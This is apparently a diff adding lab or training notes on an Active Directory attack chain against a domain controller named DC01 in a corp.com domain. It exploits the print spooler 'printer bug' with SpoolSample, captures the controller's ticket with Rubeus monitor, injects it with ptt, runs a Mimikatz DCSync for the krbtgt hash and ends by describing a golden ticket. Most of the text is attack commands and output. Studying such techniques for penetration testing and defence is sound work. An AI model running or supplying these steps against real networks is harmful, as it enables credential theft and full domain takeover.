@@ -1,0 +1,24 @@
+# In order to exploit the printer bug in this scenario, we must determine if the print spooler service is running and is available on the domain controller from FILES01
+
+# we'll log in to FILES01 as the adam user and attempt to access the named pipe with the dir command.
+
+    dir \\dc01\pipe\spoolss
+    Mode                 LastWriteTime         Length Name
+    ----                 -------------         ------ ----
+                                                  spoolss
+
+    Use Rubeus in monitor mode, which allows us to monitor incoming connections and tickets in real time.
+    .\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
+
+     Trigger the print spooler change notification with SpoolSample.exe by specifying the target machine and the capture server.
+     PS C:\Tools> .\SpoolSample.exe DC01 FILES01
+
+     We'll switch back to Rubeus, which displays the TGT for the domain controller account.
+     Lest inject the ticket to memory using the ptt command.
+     
+     PS C:\Tools> .\Rubeus.exe ptt /ticket:doIFXDCCBVigAwIBBaEDAgEWooIEcDCCBGxhgg...
+
+     Perform the DCSync attack using Mimikatz, which is also located on FILES01.
+     mimikatz # lsadump::dcsync /domain:corp.com /user:corp\krbtgt
+
+     With the krbtgt NTLM hash, we can craft a golden ticket and obtain access to any resource in the domain.
